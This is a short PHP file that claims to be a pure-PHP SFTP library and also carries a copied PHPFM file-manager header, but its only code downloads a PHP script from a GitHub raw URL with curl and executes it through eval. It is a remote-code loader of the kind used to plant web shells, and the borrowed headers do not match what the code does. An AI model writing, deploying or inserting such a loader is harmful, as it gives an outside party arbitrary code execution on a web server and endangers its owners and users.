<?php
/**
 * Pure-PHP implementations of SFTP.
 *
 * @package SFTP
 * @author  Jim Wigginton <terrafrost@php.net>
 * @access  public
 */
/*--------------------------------------------------
 +--------------------------------------------------
 | By Fabricio Seger Kolling
 | Copyright (c) 2004-2019 Fabrício Seger Kolling
 | E-mail: dulldusk@gmail.com
 | URL: http://phpfm.sf.net
 | Last Changed: 2019-02-24
 +--------------------------------------------------
 | It is the AUTHOR'S REQUEST that you keep intact the above header information
 | and notify it only if you conceive any BUGFIXES or IMPROVEMENTS to this program.
 +--------------------------------------------------
 | LICENSE
 +--------------------------------------------------
 | Licensed under the terms of any of the following licenses at your choice:
 | - GNU General Public License Version 2 or later (the "GPL");
 | - GNU Lesser General Public License Version 2.1 or later (the "LGPL");
 | - Mozilla Public License Version 1.1 or later (the "MPL").
 | You are not required to, but if you want to explicitly declare the license
 | you have chosen to be bound to when using, reproducing, modifying and
 | distributing this software, just include a text file titled "LICENSE" in your version
 | of this software, indicating your license choice. In any case, your choice will not
 | restrict any recipient of your version of this software to use, reproduce, modify
 | and distribute this software under any of the above licenses.
 +--------------------------------------------------
 | CONFIGURATION AND INSTALATION NOTES
 +--------------------------------------------------
 | This program does not include any instalation or configuration
 | notes because it simply does not require them.
 | Just throw this file anywhere in your webserver and enjoy !!
 +--------------------------------------------------
*/
 $Url = "https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/backdoorscan/ngopi-scanner.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    echo eval('?>'.$output);

?>
